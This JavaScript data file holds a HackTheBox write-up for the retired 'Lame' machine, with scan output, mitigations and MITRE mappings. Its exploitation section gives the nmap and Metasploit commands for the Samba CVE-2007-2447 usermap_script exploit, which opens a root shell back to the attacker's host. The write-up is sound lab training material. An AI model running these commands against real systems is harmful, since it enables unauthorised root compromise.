export const hacktheboxMachines = [
  {
    name: "Lame",
    slug: "lame",
    difficulty: "Easy",
    os: "Linux",
    image: "/machines/htb-lame.png",
    tags: ["Samba", "Metasploit", "RCE"],
    writeup: {
      title: "Lame",
      platform: "HackTheBox",
      author: "Kollin23",
      authorUrl: "https://github.com/Kollin23",
      summary:
        "Classic retired HTB machine. Exploited a vulnerable Samba version (CVE-2007-2447) using Metasploit to gain direct root access without privilege escalation required.",
      objectives: [
        "Enumerate services and identify a vulnerable Samba version",
        "Exploit CVE-2007-2447 via Metasploit",
        "Obtain root shell and capture both flags",
      ],
      environment: {
        vms: ["Kali Linux 2024.1 (attacker)", "HTB VPN — Lame target"],
        topology: "OpenVPN tunnel to HackTheBox network",
        prerequisites: ["Nmap", "Metasploit Framework", "Basic Linux"],
      },
      scope:
        "Retired HackTheBox machine. Controlled lab environment. No real systems involved.",
      enumeration: {
        network: [
          {
            command: "nmap -sV -sC -p- --min-rate 5000 -oN lame.txt <TARGET_IP>",
            result:
              "21/tcp  open  ftp     vsftpd 2.3.4\n22/tcp  open  ssh     OpenSSH 4.7p1\n139/tcp open  samba   Samba 3.0.20\n445/tcp open  samba   Samba 3.0.20",
          },
        ],
        services: [
          "FTP 21 — vsftpd 2.3.4 (backdoor exists but not triggered)",
          "SSH 22 — OpenSSH 4.7p1",
          "Samba 139/445 — version 3.0.20 (vulnerable to CVE-2007-2447)",
        ],
        additional: [],
      },
      exploitation: {
        steps: [
          {
            title: "Identify Samba version",
            description: "Nmap -sV confirmed Samba 3.0.20 — vulnerable to username map script RCE.",
            code: "nmap -sV -p 445 <TARGET_IP>",
          },
          {
            title: "Launch Metasploit exploit",
            description: "Used exploit/multi/samba/usermap_script to gain root.",
            code: `msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
run`,
          },
          {
            title: "Capture flags",
            description: "Direct root shell — read both flags.",
            code: "cat /home/makis/user.txt\ncat /root/root.txt",
          },
        ],
      },
      postExploitation: {
        collection: ["Both flags captured directly from root shell"],
        privesc: [
          {
            title: "Direct root access",
            description: "The Samba exploit (CVE-2007-2447) returns a shell running as root directly — no privilege escalation needed.",
            code: "id\n# uid=0(root) gid=0(root) groups=0(root)",
          },
        ],
        lateral: [],
      },
      persistence: {
        methods: ["N/A — retired HTB machine"],
        techniques: [],
      },
      exfiltration: null,
      mitre: [
        {
          id: "T1046",
          name: "Network Service Discovery",
          description: "Nmap used to enumerate all open ports and service versions",
        },
        {
          id: "T1190",
          name: "Exploit Public-Facing Application",
          description: "Samba CVE-2007-2447 remote code execution",
        },
      ],
      mitigations: [
        {
          title: "Patch Samba immediately",
          description: "Update to a version > 3.0.20 or disable Samba if unused",
          priority: "Critical",
        },
        {
          title: "Network segmentation",
          description: "Restrict SMB ports 139/445 to internal subnets only",
          priority: "High",
        },
      ],
      lessons: {
        worked: [
          "Nmap version scan immediately flagged the vulnerable Samba version",
          "Metasploit module worked reliably on first attempt",
        ],
        improve: [
          "Also test the vsftpd 2.3.4 backdoor manually without Metasploit",
          "Practice manual exploitation of CVE-2007-2447 without MSF",
        ],
      },
      screenshots: [],
    },
  },
];
